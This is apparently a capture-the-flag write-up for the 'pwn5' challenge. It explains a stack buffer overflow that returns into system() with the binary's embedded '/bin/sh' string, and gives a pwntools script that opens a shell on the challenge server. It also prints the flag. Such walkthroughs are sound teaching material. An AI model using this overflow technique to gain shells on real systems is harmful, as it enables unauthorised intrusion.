# pwn / pwn5

> Points: 2892

## Question

```
nc uwctf.ml 6006
```

## Solution

The win function has been replaced so it no longer prints the flag.  
```c
void win(void) {
    system("/bin/echo unhackable");
    return;
}
```

We'll have to find a way to get a shell and print it manually, time for our first shell exploit!  
This is made easier by the fact that the program contains the string "/bin/sh".
```
        08048650 2f 62 69        char[8]    "/bin/sh"
                 6e 2f 73 
                 68 00
```

So all we really have to do is jump to `system` with `"/bin/sh"` as a parameter.  
Remember the string `"/bin/sh"` was stored at offset in the binary `0x08048650`.  
This is just the same code as pwn2 but with a different function and a different parameter value.
```python
from pwn import *

exe = ELF("chall5.bin")
p = remote("uwctf.ml", 6006)
p.send(b"A" * 28 + p32(exe.sym["system"]) + b"AAAA" + p32(0x08048650) + b"\n")
p.interactive()
```

### Flag

`uwctf{buff3r0v3rf10w5_dab2a4447a729143}`
